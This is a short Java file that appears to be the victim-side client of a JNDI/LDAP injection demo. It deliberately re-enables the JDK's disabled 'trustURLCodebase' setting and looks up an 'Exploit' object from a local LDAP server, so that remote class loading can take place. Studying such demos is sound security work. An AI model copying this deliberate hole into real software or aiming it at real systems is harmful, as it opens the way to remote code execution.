package xianzhan.jndi.ldap.client;

import javax.naming.Context;
import javax.naming.InitialContext;

/**
 * @author xianzhan
 * @since 2021-12-19
 */
public class Main {

    public static void main(String[] args) throws Exception {
        // 为了安全，JDK 默认将该值关闭，无法自动反序列化
        System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");

        Context ctx = new InitialContext();
        Object lookup = ctx.lookup("ldap://127.0.0.1:2021/Exploit");
        System.out.println(lookup);
    }
}
